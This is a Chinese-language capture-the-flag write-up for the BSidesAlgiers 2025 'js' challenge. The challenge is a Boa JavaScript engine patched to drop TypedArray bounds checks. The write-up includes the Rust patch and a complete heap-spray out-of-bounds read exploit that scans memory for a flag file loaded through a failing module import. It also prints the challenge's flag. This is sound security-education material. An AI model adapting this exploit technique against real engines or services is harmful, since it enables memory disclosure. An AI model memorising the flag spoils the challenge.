# BSidesAlgiers2025 - js

## 题目简述

服务把用户提交的 JavaScript 写入临时文件，再交给定制版 Boa 引擎执行，超时为 15 秒。附件没有官方 solver，但 `challenge.diff` 明确移除了 TypedArray 的整数索引边界检查，并把底层切片访问改为 Rust 的 `get_unchecked`；因此 `Uint8Array` 可以越界读取相邻堆内存。利用目标不是直接获得代码执行，而是先让模块加载器把 flag 文件读进进程，再用 OOB read 搜索其内容。

## 解题过程

### 确认漏洞原语

补丁同时破坏了上层和下层两道边界：

```rust
// TypedArray::integer_indexed_element_get 中被删除
// if index < 0.0 || index >= length as f64 {
//     return None;
// }

// ArrayBuffer 切片改成无检查访问
Self::Slice(buffer) => unsafe {
    SliceRef::Slice(buffer.get_unchecked(index))
}
```

正常情况下，读取 `view[view.length + n]` 应返回 `undefined`；题目引擎会把索引继续传到底层缓冲区，形成堆 OOB 读。

### 让 flag 进入内存

Boa 的动态模块加载器可以读取本地模块。`import("/home/ctf/flag.txt")` 会先把文件内容装入内存，再因为文本不是合法 JavaScript 而解析失败。把扫描代码放在 Promise 的 `catch` 中，可以保证搜索发生在文件已经读取之后。

由于只能读到当前 TypedArray 邻近内存，需要在加载前申请大量同尺寸缓冲区稳定堆布局，加载失败后再做一次较小的喷射，使模块源码缓冲更可能落在可达区域。下面是根据补丁重写的最小利用；同时搜索 ASCII 与 UTF-16LE 表示：

```javascript
const SIZE = 0x400;
const before = [];
for (let i = 0; i < 9000; i++) {
  before.push(new Uint8Array(SIZE));
}

const marker = "shellmates{";

function scan(view, stride) {
  const stop = view.length + 0x4000;
  for (let pos = view.length; pos < stop; pos++) {
    let ok = true;
    for (let j = 0; j < marker.length; j++) {
      if (view[pos + j * stride] !== marker.charCodeAt(j)) ok = false;
      if (stride === 2 && view[pos + j * 2 + 1] !== 0) ok = false;
      if (!ok) break;
    }
    if (!ok) continue;

    let result = "";
    for (let j = 0; j < 160; j++) {
      const code = stride === 1
        ? view[pos + j]
        : view[pos + j * 2] | (view[pos + j * 2 + 1] << 8);
      if (code === 0 || code === 10) break;
      result += String.fromCharCode(code);
      if (code === 125) return result;
    }
  }
  return "";
}

import("/home/ctf/flag.txt").catch(() => {
  const after = [];
  for (let i = 0; i < 2000; i++) {
    after.push(new Uint8Array(SIZE));
  }

  for (let i = before.length - 1; i >= before.length - 120; i--) {
    const ascii = scan(before[i], 1);
    if (ascii) { console.log(ascii); return; }
    const utf16 = scan(before[i], 2);
    if (utf16) { console.log(utf16); return; }
  }
  console.log("NOT FOUND");
});
0;
```

提交时以单独一行 `EOF` 结束。`9000/2000/120/0x4000` 都是为了在 15 秒限制内兼顾覆盖率的经验参数，并非漏洞成立所需的数学常量；不同构建或堆布局下可能要小幅调整。

公开的 [js Pwn 解题记录](https://medium.com/@saad_alqarni/bsides-algiers-2025-js-pwn-write-up-8637a4af1970) 通过同一“模块读取后解析失败 + TypedArray 越界扫描”链取得结果；正文已独立重建原理和利用代码。仓库内 flag 文件也与其输出一致：

`shellmates{1_GuE$s_1t$_$0LvaBLe_xdddddddd}`

本轮没有重新启动题目容器执行堆喷射，因此该结果属于源码、公开复现与附件 flag 三方对账，不表述为当前环境动态利用通过。

## 方法总结

- Rust 中的 `unsafe get_unchecked` 只有在调用者已经证明边界时才安全；题目同时删掉上层长度检查，使该假设彻底失效。
- 文件加载失败不等于文件没有进入内存。解析器报错前通常已经完成读取，可把失败路径当作数据驻留原语。
- OOB read 的稳定性主要取决于堆布局和时间预算；同尺寸喷射、只扫描最近对象、先匹配固定前缀能显著减少搜索量。
